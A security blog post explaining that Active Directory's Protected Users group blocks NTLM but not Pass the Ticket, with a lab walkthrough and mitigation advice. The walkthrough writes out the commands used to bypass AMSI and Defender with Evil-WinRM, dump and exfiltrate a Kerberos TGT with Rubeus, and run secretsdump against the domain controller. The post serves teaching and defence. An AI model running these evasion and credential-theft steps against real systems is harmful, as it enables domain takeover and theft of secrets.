--- 
title: "Protected Users: Not a silver bullet against lateral movement"
layout: "post"
categories: ["Active Directory"] 
tags: ["Protected Users", "Pass the ticket", "Evil-WinRM", "Rubeus"]
---
The idea of this post came from a discussion with a client, when he told me that he will keep using members of the Domain Admins group to administer all his servers, as they also will be members of the Protected Users group. The reasoning behind was that as NTLM authentication is disabled for members of Protected Users, [Pass the Hash](https://en.hackndo.com/pass-the-hash/) will not be possible anymore for lateral movement. That's true for the Pass the Hash part, but Kerberos authentication is still there, and so is [Pass the Ticket](https://www.thehacker.recipes/ad/movement/kerberos/ptt) for lateral movement! As I didn't play that much with Pass the Ticket until then, it was a good occasion to fire up a lab and practice this technique.

In this post, I will summarize what Protected Users group is, show its impact on NTLM and Kerberos credentials in LSASS process memory, and demo how to do lateral movement using Pass the Ticket while evading Microsoft Defender Antivirus detection. Finally, I will say a few words about mitigations.

## Protected Users
### Overview
Let's summarize the relevant parts from [Microsoft's official documentation](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group), then focus on a few subjects. *The Protected Users security group is designed as part of a strategy to manage credential exposure within the enterprise. Members of this group automatically have non-configurable protections applied to their accounts.* The protections are described in two parts; [device protections](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group#device-protections-for-signed-in-protected-users) and [Domain controller](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group#domain-controller-protections-for-protected-users) protections.

### Device protections
These protections apply on a Windows endpoint in the session of a signed in Protected Users member:
-   Credential delegation (CredSSP) will not cache the user's plain text credentials even when the *Allow delegating default credentials* Group Policy setting is enabled.  
-   Beginning with Windows 8.1 and Windows Server 2012 R2, Windows Digest will not cache the user's plain text credentials even when Windows Digest is enabled.
-   NTLM will not cache the user's plain text credentials or NT one-way function (NTOWF).
-   Kerberos will no longer create DES or RC4 keys. Also, it will not cache the user's plain text credentials or long-term keys after the initial TGT is acquired.
-   A cached verifier is not created at sign-in or unlock, so offline sign-in is no longer supported.

### Domain controller protections
These protections apply to user accounts members of the Protected Users group, at the domain level. These accounts are unable to:
-   Authenticate with NTLM authentication.
-   Use DES or RC4 encryption types in Kerberos pre-authentication.
-   Be delegated with unconstrained or constrained delegation.
-   Renew the Kerberos TGTs beyond the initial four-hour lifetime.

### Impact on NTLM authentication
From above description, we can extract the two following protections that impact NTLM authentication:

- **Authenticate with NTLM authentication**: This is quite straight-forward; you cannot do NTLM authentication anymore with an account member of the Protected Users group.

- **NTLM will not cache the user's plain text credentials or NT one-way function (NTOWF)**: This means that the NT hash is not stored in the LSASS process memory anymore; you cannot attempt to crack it offline to get the user's password.

Let see the latter in practice on a Windows host, using [mimikatz](https://github.com/gentilkiwi/mimikatz). We have the user *thomas.anderson*, not member of the Protected Users group, connected to our target. We dump LSASS process memory with mimikatz and can see its NT hash:

![NT hash from LSASS process memory](/assets/posts/2023-05-03-ProtectedUsers_NotASilverBullet/01_mimikatzNotPU.png)
_NT hash (NTLM) from LSASS process memory_

Now let's put *thomas.anderson* in Protected Users:

![Adding "thomas.anderson" user to Protected Users group](/assets/posts/2023-05-03-ProtectedUsers_NotASilverBullet/02_addInPU.png)
_Adding "thomas.anderson" to Protected Users group_

After signing out and back in, we have a look on LSASS memory's secrets again:
![NT hash is missing](/assets/posts/2023-05-03-ProtectedUsers_NotASilverBullet/03_mimikatzInPU.png)
_NT hash (NTLM) is missing_

As expected, the NT hash is not there anymore. Pass the Hash and NT hash cracking will not be possible with members of the Protected Users group.

### Impact on Kerberos authentication
From the protections listed before, the following impact Kerberos authentication:

- **Kerberos will no longer create DES or RC4 keys**: DES and RC4 are considered weak encryption types, both vulnerable to different attacks. Members of Protected Users cannot use these encryption types anymore.

- **Unable to be delegated with unconstrained or constrained delegation**: Kerberos delegation can be abused in different ways to gain privileges from a target account. Members of Protected Users cannot be delegated, so they cannot be targeted by these kinds of abuses. Except for the domain *Administrator* account who needs an extra step to be protected, as explained in [this blog post](https://sensepost.com/blog/2023/protected-users-you-thought-you-were-safe-uh/).

- **Unable to renew the Kerberos TGTs beyond the initial four-hour lifetime**: I don't really see how useful this restriction is against Kerberos attacks, but it is not always welcomed by the system administrators. It means that your TGT is valid for 4 hours instead of the default 10, and as it doesn't renew by itself, the administrator has to reauthenticate after 4 hours. The experience in the AD administration tools can be confusing at the beginning, so it is something to keep in mind.

So there is protections and restrictions on Kerberos authentication for members of Protected Users, but nothing that prevents from doing Pass the Ticket! Let's put the hoodie on and see how this works.

## Pass the Ticket against Protected Users
To test this, we will attack the **matrix.local** domain, using this very simple lab setup:
![DARK matrix.local lab diagram](/assets/posts/2023-05-03-ProtectedUsers_NotASilverBullet/04-dark_matrix-lab.png){: .dark }
![LIGHT matrix.local lab diagram](/assets/posts/2023-05-03-ProtectedUsers_NotASilverBullet/04-light_matrix-lab.png){: .light }
_matrix.local lab diagram_

A Domain Controller named **DC01**, running up to date Windows Server 2019 and Microsoft Defender Antivirus:
![DC01 system details](/assets/posts/2023-05-03-ProtectedUsers_NotASilverBullet/05_DC01Details.png)
_DC01 system details_

An application server named **SRV01-WS16**, running up to date Windows Server 2016 and Microsoft Defender Antivirus:
![SRV01-WS16 system details](/assets/posts/2023-05-03-ProtectedUsers_NotASilverBullet/06_SRV01WS16Details.png)
_SRV01-WS16 system details_

Let's assume a quite standard and simplified scenario; we, as the attacker, got initial access to the network by infecting a client endpoint, and managed to move laterally to an application server, here **SRV01-WS16**, where we have local administrator privileges. The port 5985 is open, so we can use WinRM to connect to **SRV01-WS16** with the administrator account we compromised. We will use [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) from our Kali attacking machine to start the PowerShell session:
```zsh
evil-winrm -i 192.168.47.11 -u administrator -p "PASSWORD123."
```
{: .nolineno }

![Login from Kali to SRV01-WS16 with Evil-WinRM](/assets/posts/2023-05-03-ProtectedUsers_NotASilverBullet/07_WinRMLogin.png)
_Login from Attacker to SRV01-WS16 with Evil-WinRM_

Next, we will use [Rubeus](https://github.com/GhostPack/Rubeus) to look for Kerberos tickets on our target and extract the interesting one. We know that Microsoft Defender Antivirus (MDAV) is enabled and up to date on this machine, so we cannot just drop and use a well-known tool like *Rubeus.exe* on this system, we have to find a way to avoid detection. First, we will enable the `Bypass-4MSI` feature from *Evil-WinRM*, so we can execute the next commands without being detected by MDAV. Then, we will use `Invoke-Binary` from *Evil-WinRM*, to load *Rubeus.exe* in memory, uploaded from our attacking machine, with the command `triage` to list the Kerberos tickets on the target:
```powershell
Bypass-4MSI
```
{: .nolineno }

![Bypassing AMSI with Evil-WinRM built-in feature](/assets/posts/2023-05-03-ProtectedUsers_NotASilverBullet/08_WinRMBypassAMSI.png)
_Bypassing AMSI with Evil-WinRM built-in feature_

```powershell
Invoke-Binary /opt/microsoft/Rubeus.exe triage
```
{: .nolineno }

![Uploading and executing Rubeus.exe in memory](/assets/posts/2023-05-03-ProtectedUsers_NotASilverBullet/09_RubeusTriage.png)
_Uploading and executing Rubeus.exe in memory_

It seems that we have an interesting ticket; a TGT for the user *thomas.anderson*. Let's see the details of this ticket:
```powershell
Invoke-Binary /opt/microsoft/Rubeus.exe klist,/luid:0x3d909
```

![Details of TGT for user "thomas.anderson"](/assets/posts/2023-05-03-ProtectedUsers_NotASilverBullet/10_RubeusKlist.png)
_Details of TGT for user "thomas.anderson"_

The ticket is valid for 4 hours, one of the protections applied on members of the Protected Users group, as described earlier. 
Now, let's extract this ticket. We first dump the ticket in base64 format:
```powershell
Invoke-Binary /opt/microsoft/Rubeus.exe dump,/luid:0x3d909,/nowrap
```
{: .nolineno }

![TGT dump with Rubeus](/assets/posts/2023-05-03-ProtectedUsers_NotASilverBullet/11_RubeusDump.png)
_TGT dump with Rubeus_

Then convert it to a .kirbi ticket file:
```powershell
[IO.File]::WriteAllBytes("c:\temp\toanTGT.kirbi", [Convert]::FromBase64String("<BASE64TICKET>"))
```
{: .nolineno }

![TGT conversion from base64 to kirbi](/assets/posts/2023-05-03-ProtectedUsers_NotASilverBullet/12_TGTBase64ToKirbi.png)
_TGT conversion from base64 to kirbi_

Finally, we download the ticket file to our Kali machine:
```powershell
download c:\temp\toanTGT.kirbi toanTGT.kirbi
```
{: .nolineno }

![Downloading TGT to attacker machine](/assets/posts/2023-05-03-ProtectedUsers_NotASilverBullet/13_TGTDownload.png)
_Downloading TGT to attacker machine_

We have *thomas.anderson* TGT on our attacking machine, let's use it now! To do so, we need to convert it from Windows to Unix format (.kirbi to .ccache). We will use `ticketConverter` from [Impacket](https://github.com/fortra/impacket):
```zsh
impacket-ticketConverter toanTGT.kirbi toanTGT.ccache
```
{: .nolineno }

![Converting TGT from kirbi to ccache](/assets/posts/2023-05-03-ProtectedUsers_NotASilverBullet/14_TGTKirbiToCcache.png)
_Converting TGT from kirbi to ccache_

Then we reference it in the `KRB5CCNAME` environment variable to use it with the other tools:
```zsh
export KRB5CCNAME=toanTGT.ccache
```
{: .nolineno }

![Referencing TGT in KRB5CCNAME](/assets/posts/2023-05-03-ProtectedUsers_NotASilverBullet/15_TGTExport.png)
_Referencing TGT in KRB5CCNAME_

Finally, we use `secretsdump` with our Kerberos ticket (`-k`), against the Domain Controller:

![Dumping secrets from DC01 with stolen TGT](/assets/posts/2023-05-03-ProtectedUsers_NotASilverBullet/16_Secretdump.png)
_Dumping secrets from DC01 with stolen TGT_

The user *thomas.anderson* is member of the *Domain Admins* group, so we can dump all the secrets from the Domain Controller; **now we own the domain**!

As we saw in this attack, it doesn't require too much effort do lateral movement using Kerberos authentication, and members of the Protected Users group are not protected against it. Our TGT will be valid for a shorter period of time, 4 hours instead of the default 10, but if we get it in the first place we can assume that we can get another one the same way. Also, we saw that Microsoft Defender Antivirus can be bypassed very easily with the proper tools. I will show in a future post how this attack goes against a proper Endpoint Detection and Response solution, which will be a bit more complex to bypass.

## Mitigations
Speaking in [MITRE ATT&CK](https://attack.mitre.org/) terms, the main subjects here are [OS Credentials Dumping: LSASS Memory](https://attack.mitre.org/techniques/T1003/001/) and [Use Alternate Authentication Material: Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/). The most relevant mitigations listed, for our scenario, are [Credential Access Protection](https://attack.mitre.org/mitigations/M1043/) and [Privileged Account Management](https://attack.mitre.org/mitigations/M1026/).

### Credential Access Protection
[LSA protection](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection) was enabled on **SRV01-WS16**, so this won't help. My understanding is that the[ `dump` command from *Rubeus*](https://posts.specterops.io/rubeus-now-with-more-kekeo-6f57d91079b9) doesn't read memory of or inject code in LSASS process - which is what LSA protection covers - but uses legitimate LSA functions to enumerate and retrieve the Kerberos tickets, so it is not blocked by LSA protection.

I think [Windows Defender Credential Guard](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-manage) (WDCG) will help in this case, I didn't test this attack against this protection yet. It worth noting that WDGC has requirements that won't fit all environment.

### Privileged Account Management
It is a very large topic and there is a lot of implementations and solutions covering it. In our attack scenario, we got credentials from a member of Domain Admins, on a standard server member of the domain. It is important to keep these highly privileged accounts for Domain Controllers administration only. This leads us to the AD tier model, which is now superseded and replaced by the [Enterprise access model](https://learn.microsoft.com/en-us/security/privileged-access-workstations/privileged-access-access-model). From my perspective, the Enterprise access model is an evolution and enhancement of the AD tier model that takes in consideration the cloud part of the environment. This means that the "legacy" AD tier model is still valid for on-premises Active Directory. I will probably post something on this subject as I spent quite some time working on it. In the meantime, don't hesitate to reach out if you want to exchange on this subject!